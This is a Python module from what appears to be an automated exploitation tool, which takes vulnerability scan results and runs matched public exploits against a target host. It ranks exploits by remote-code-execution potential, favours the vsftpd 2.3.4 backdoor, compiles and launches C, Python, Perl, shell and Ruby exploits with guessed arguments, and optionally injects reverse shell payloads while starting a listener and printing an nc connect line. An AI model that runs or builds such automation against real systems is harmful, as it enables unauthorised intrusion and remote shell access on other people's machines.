#!/usr/bin/env python3
import subprocess
import logging
import os
from pathlib import Path
from .payload_manager import payload_manager

logging.basicConfig(level=logging.INFO, format="%(levelname)s: %(message)s")

class SmartExploitRunner:
    def __init__(self):
        # known working exploits (prioritize these) for testing purposes for now later we can remove this
        self.high_priority_exploits = [
            'vsftpd_2.3.4_backdoor',
            '49757.py',  # vsftpd backdoor
            'custom_vsftpd_backdoor.py',
            'enhanced_vsftpd_exploit.py'
        ]
        
        # RCE detection patterns (high-value targets)
        self.rce_patterns = [
            'remote code execution',
            'rce',
            'command execution',
            'command injection',
            'buffer overflow',
            'stack overflow',
            'heap overflow',
            'backdoor',
            'shell',
            'reverse shell',
            'bind shell',
            'arbitrary code',
            'code injection',
            'remote exploit',
            'remote buffer',
            'memory corruption'
        ]
        
        # Info disclosure patterns (medium value)
        self.info_disclosure_patterns = [
            'information disclosure',
            'file disclosure',
            'directory traversal',
            'path traversal',
            'file inclusion',
            'sql injection',
            'privilege escalation',
            'authentication bypass',
            'session hijacking'
        ]
        
        # Low-value/DoS patterns
        self.low_value_patterns = [
            'denial of service',
            'dos',
            'crash',
            'memory leak',
            'null pointer',
            'assertion failure'
        ]
        
        # exploits to skip problematic because they rely mostly on client side or have incomplete POCs or are incompatible with python 3
        self.skip_patterns = [
            'cross-site',
            'xss',
            'html injection',
            'csrf',
            'null character',
            'cookie disclosure',
            'proof of concept',
            'poc',
            'unquoted service path',
            'mod_negotiation',
            'renegotiation',
            'response splitting',
            'missing parentheses',  # python 2 vs 3 issues
            'modsecurity'
        ]
        
        # file extensions to skip (because these are not executable or are not useful for active exploitation)
        self.skip_extensions = ['.txt', '.html', '.md', '.pdf', '.doc', '.java', '.php']
    
    def classify_exploit(self, exploit_title, exploit_path=""):
        title_lower = exploit_title.lower()
        path_lower = exploit_path.lower()
        combined = f"{title_lower} {path_lower}"
        
        # check for RCE patterns (highest priority)
        for pattern in self.rce_patterns:
            if pattern in combined:
                if any(easy in path_lower for easy in ['.py', '.sh', '.pl']):
                    return ("CRITICAL_RCE", 100, f" High-value RCE exploit ({pattern})")
                else:
                    return ("RCE", 90, f" RCE exploit ({pattern})")
        
        # check for info disclosure (medium priority)
        for pattern in self.info_disclosure_patterns:
            if pattern in combined:
                return ("INFO_DISCLOSURE", 60, f" Information disclosure ({pattern})")
        
        # check for DoS/low-value (low priority)
        for pattern in self.low_value_patterns:
            if pattern in combined:
                return ("LOW_VALUE", 20, f" DoS/Low-value ({pattern})")
        
        # Default classification
        if any(easy in path_lower for easy in ['.py', '.sh', '.pl']):
            return ("UNKNOWN_EASY", 50, " Unknown (easy to modify)")
        else:
            return ("UNKNOWN", 30, " Unknown exploit type")
    
    def should_skip_exploit(self, exploit_path, exploit_title):
        
        # skip based on file extension
        _, ext = os.path.splitext(exploit_path)
        if ext.lower() in self.skip_extensions:
            return True, f"Non-executable file type: {ext}"
        
        # skip based on title patterns
        title_lower = exploit_title.lower()
        for pattern in self.skip_patterns:
            if pattern in title_lower:
                return True, f"Known problematic exploit type: {pattern}"
        
        return False, ""
    
    def is_high_priority(self, exploit_path):
        path_str = str(exploit_path).lower()
        return any(priority in path_str for priority in self.high_priority_exploits)

# these ones are up for improvements
    def run_python_exploit(self, path, target, port):
        try:
            logging.info(f"-> Running Python exploit: {path}")
            
            # try different parameter combinations
            attempts = [
                [target, str(port)],  # standard: host port
                [target],             # just host
                [f"{target}:{port}"], # host:port format
            ]
            
            for attempt in attempts:
                try:
                    cmd = ["python3", str(path)] + attempt
                    output = subprocess.check_output(
                        cmd, stderr=subprocess.STDOUT, text=True, timeout=30
                    )
                    logging.info(f"-> Success with parameters: {attempt}")
                    print(f"\n{'='*60}")
                    print(f"EXPLOIT OUTPUT - {os.path.basename(path)}")
                    print(f"{'='*60}")
                    print(output)
                    print(f"{'='*60}\n")
                    return True
                except subprocess.CalledProcessError as e:
                    continue  # try next parameter combination
                except subprocess.TimeoutExpired:
                    logging.warning(f"! Timeout with parameters: {attempt}")
                    continue
            
            return False
            
        except Exception as e:
            logging.error(f"! Python exploit failed: {e}")
            return False
    
    def run_c_exploit(self, path, target, port):
        try:
            binary = Path(path).stem
            logging.info(f"-> Compiling C exploit: {path}")
            
            # try to compile
            result = subprocess.run(
                ["gcc", "-w", str(path), "-o", binary],  # -w  to suppresses warnings
                capture_output=True, text=True, timeout=30
            )
            
            if result.returncode != 0:
                logging.error(f"! Compilation failed: {result.stderr}")
                return False
            
            # try to run with different parameters
            attempts = [
                [target, str(port)],
                [target],
                # some exploits expect specific formats
            ]
            
            for attempt in attempts:
                try:
                    cmd = [f"./{binary}"] + attempt
                    output = subprocess.check_output(
                        cmd, stderr=subprocess.STDOUT, text=True, timeout=30
                    )
                    logging.info(f"-> Success with parameters: {attempt}")
                    print(f"\n{'='*60}")
                    print(f"EXPLOIT OUTPUT - {binary}")
                    print(f"{'='*60}")
                    print(output)
                    print(f"{'='*60}\n")
                    os.remove(binary)
                    return True
                except subprocess.CalledProcessError:
                    continue
                except subprocess.TimeoutExpired:
                    logging.warning(f"! Exploit timed out")
                    break
            
            # clean up binary
            if os.path.exists(binary):
                os.remove(binary)
            return False
            
        except Exception as e:
            logging.error(f"! C exploit failed: {e}")
            return False
    
# incase the exploit is not a python or a c exploit rather some other kind of script like perl, shell, etc.
    def run_script_exploit(self, path, target, port, interpreter):
        try:
            logging.info(f"-> Running {interpreter} script: {path}")
            
            attempts = [
                [target, str(port)],
                [target],
            ]
            
            for attempt in attempts:
                try:
                    cmd = [interpreter, str(path)] + attempt
                    output = subprocess.check_output(
                        cmd, stderr=subprocess.STDOUT, text=True, timeout=30
                    )
                    logging.info(f"-> Success with parameters: {attempt}")
                    print(f"\n{'='*60}")
                    print(f"EXPLOIT OUTPUT - {os.path.basename(str(path))}")
                    print(f"{'='*60}")
                    print(output)
                    print(f"{'='*60}\n")
                    return True
                except subprocess.CalledProcessError:
                    continue
                except subprocess.TimeoutExpired:
                    logging.warning(f"! Script timed out")
                    break
            
            return False
            
        except Exception as e:
            logging.error(f"! {interpreter} script failed: {e}")
            return False

def run_exploits_smart(cve_results, target):
   
    runner = SmartExploitRunner()
    successful_exploits = []
    
    # check if we have any RCE exploits first
    rce_exploits_found = []
    for service in cve_results:
        found_exploits = service.get('exploits', [])
        for exp in found_exploits:
            category, priority_score, description = runner.classify_exploit(
                exp.get('Title', ''), exp.get('Path', '')
            )
            if 'RCE' in category:
                rce_exploits_found.append({
                    'service': service,
                    'exploit': exp,
                    'category': category,
                    'description': description
                })
    
    # if RCE exploits found, offer payload configuration (this part is also up for improvements because even after expecting the parameters it is not really spawing a connecting shell in here (need to test whether a reverse shell is spawned at the target or not))
    payload_config = None
    if rce_exploits_found:
        print(f"\n Found {len(rce_exploits_found)} RCE exploits with shell potential!")
        print("These exploits can be enhanced with reverse shell payloads for direct access.")
        
        while True:
            choice = input("\nWould you like to configure reverse shell payloads? (y/n): ").lower().strip()
            if choice in ['y', 'yes']:
                payload_config = payload_manager.get_user_configuration()
                # Start listener
                payload_manager.start_listener(payload_config['lport'], "0.0.0.0")
                break
            elif choice in ['n', 'no']:
                print("  Running exploits without payload enhancement.")
                break
            else:
                print("Please enter 'y' or 'n'")

    for service in cve_results:
        port = service.get('port')
        product = service.get('product', '')
        version = service.get('version', '')
        found_exploits = service.get('exploits', [])

        logging.info(f"\n-> Target port {port} - product: {product} - version: {version}")
        
        if not found_exploits:
            logging.warning(f"! No exploits found to run for port {port}")
            continue

        # classify and sort exploits by RCE potential and priority
        classified_exploits = []
        for exp in found_exploits:
            category, priority_score, description = runner.classify_exploit(
                exp.get('Title', ''), exp.get('Path', '')
            )
            exp['category'] = category
            exp['priority_score'] = priority_score
            exp['description'] = description
            classified_exploits.append(exp)
        
        # sort by priority score (highest first)
        sorted_exploits = sorted(
            classified_exploits, 
            key=lambda x: x.get('priority_score', 0), 
            reverse=True
        )
        
        # show RCE analysis for this service
        rce_exploits = [e for e in sorted_exploits if 'RCE' in e.get('category', '')]
        if rce_exploits:
            logging.info(f" Found {len(rce_exploits)} RCE exploits for this service:")
            for exp in rce_exploits[:3]:  # Show top 3
                logging.info(f"   {exp.get('description', '')} - {exp.get('Title', '')}")
        
        exploits_tried = 0
        max_exploits_per_service = 5  # limit to avoid spam and create noise 
        
        for exp in sorted_exploits:
            if exploits_tried >= max_exploits_per_service:
                logging.info(f"[*] Limiting to {max_exploits_per_service} exploits per service")
                break
                
            path = exp.get('Path', '')
            title = exp.get('Title', '')
            
            # check if we should skip this exploit
            should_skip, reason = runner.should_skip_exploit(path, title)
            if should_skip:
                logging.info(f"[*] Skipping: {title} - {reason}")
                continue
            
            exploits_tried += 1
            ext = Path(path).suffix.lower()
            
            logging.info(f"[*] Trying exploit: {title} ({path})")
            success = False
            
            # check if this is an RCE exploit and we have payload config
            is_rce = 'RCE' in exp.get('category', '')
            modified_path = path
            
            if is_rce and payload_config:
                print(f"\n Enhancing RCE exploit with reverse shell payload...")
                payload = payload_manager.generate_payload(
                    payload_config['payload_type'],
                    payload_config['lhost'],
                    payload_config['lport']
                )
                print(f" Payload: {payload}")
                
                # modify exploit with payload
                modified_path = payload_manager.modify_exploit_with_payload(
                    path, payload, target, port
                )
                if modified_path:
                    print(f" Exploit enhanced with payload")
                    logging.info(f"-> Using enhanced exploit: {modified_path}")
                else:
                    print(f"  Payload injection failed, using original exploit")
                    modified_path = path

            try:
                if ext == '.py':
                    success = runner.run_python_exploit(modified_path, target, port)
                elif ext == '.c':
                    success = runner.run_c_exploit(modified_path, target, port)
                elif ext == '.pl':
                    success = runner.run_script_exploit(modified_path, target, port, 'perl')
                elif ext == '.sh':
                    success = runner.run_script_exploit(modified_path, target, port, 'bash')
                elif ext == '.rb':
                    success = runner.run_script_exploit(modified_path, target, port, 'ruby')
                else:
                    logging.warning(f"! Unsupported file type {ext}: {path}")
                    continue

                if success:
                    if is_rce and payload_config:
                        logging.info(f"->  RCE EXPLOIT WITH PAYLOAD SUCCEEDED: {title}")
                        print(f"\n SHELL ACCESS POSSIBLE!")
                        print(f" Check your listener on port {payload_config['lport']}")
                        print(f" Connect with: nc {payload_config['lhost']} {payload_config['lport']}")
                    else:
                        logging.info(f"->  EXPLOIT SUCCEEDED: {title}")
                    
                    successful_exploits.append({
                        'port': port,
                        'service': f"{product} {version}",
                        'exploit': title,
                        'path': path,
                        'category': exp.get('category', 'UNKNOWN'),
                        'description': exp.get('description', ''),
                        'enhanced_with_payload': is_rce and payload_config is not None
                    })
                    # don't break rather try more exploits to find all working ones
                else:
                    logging.info(f"!  Exploit failed: {title}")
                    
            except Exception as e:
                logging.error(f"! Unexpected error with {title}: {e}")

        logging.info("")  # add spacing between services

    # print the summary
    logging.info("="*60)
    logging.info("EXPLOITATION SUMMARY")
    logging.info("="*60)
    
    if successful_exploits:
        # categorize successful exploits
        rce_successes = []
        rce_with_payload = []
        other_successes = []
        
        for exploit in successful_exploits:
            if 'RCE' in exploit.get('category', ''):
                if exploit.get('enhanced_with_payload', False):
                    rce_with_payload.append(exploit)
                else:
                    rce_successes.append(exploit)
            else:
                other_successes.append(exploit)
        
        logging.info(f"-> {len(successful_exploits)} SUCCESSFUL EXPLOITS:")
        
        if rce_with_payload:
            logging.info(f" {len(rce_with_payload)} RCE EXPLOITS WITH PAYLOAD (SHELL ACCESS):")
            for exploit in rce_with_payload:
                logging.info(f"     Port {exploit['port']} ({exploit['service']}): {exploit['exploit']}")
        
        if rce_successes:
            logging.info(f" {len(rce_successes)} RCE EXPLOITS (HIGH VALUE):")
            for exploit in rce_successes:
                logging.info(f"     Port {exploit['port']} ({exploit['service']}): {exploit['exploit']}")
        
        if other_successes:
            logging.info(f" {len(other_successes)} OTHER EXPLOITS:")
            for exploit in other_successes:
                logging.info(f"     Port {exploit['port']} ({exploit['service']}): {exploit['exploit']}")
                
        # Enhanced guidance
        if rce_with_payload:
            logging.info("")
            logging.info(" SHELL ACCESS READY:")
            logging.info("   Exploits with payloads executed successfully!")
            logging.info("   Check your listeners for incoming connections.")
            payload_manager.list_active_listeners()
        elif rce_successes:
            logging.info("")
            logging.info(" RCE EXPLOITATION OPPORTUNITIES:")
            logging.info("   These exploits have RCE potential - consider:")
            logging.info("   • Re-running with payload configuration")
            logging.info("   • Setting up reverse shell listeners manually")
            logging.info("   • Using Metasploit versions for automatic shells")
            
    else:
        logging.info("[-] No exploits succeeded")
        logging.info("[*] Possible reasons:")
        logging.info("    - Target is patched/updated")
        logging.info("    - Services are properly configured")
        logging.info("    - Exploits need manual configuration")
        logging.info("    - Network filtering/firewalls")
    
    # show final listener status
    if payload_config:
        print("\n" + "="*60)
        payload_manager.list_active_listeners()
        print(" Listeners will remain active. Press Ctrl+C to stop.")
    
    return successful_exploits

# backwards compatibility (since i had different name for this function earlier, will need to refactor the code and then remove this function)
def run_exploits(cve_results, target):
    """Wrapper for backwards compatibility"""
    return run_exploits_smart(cve_results, target)
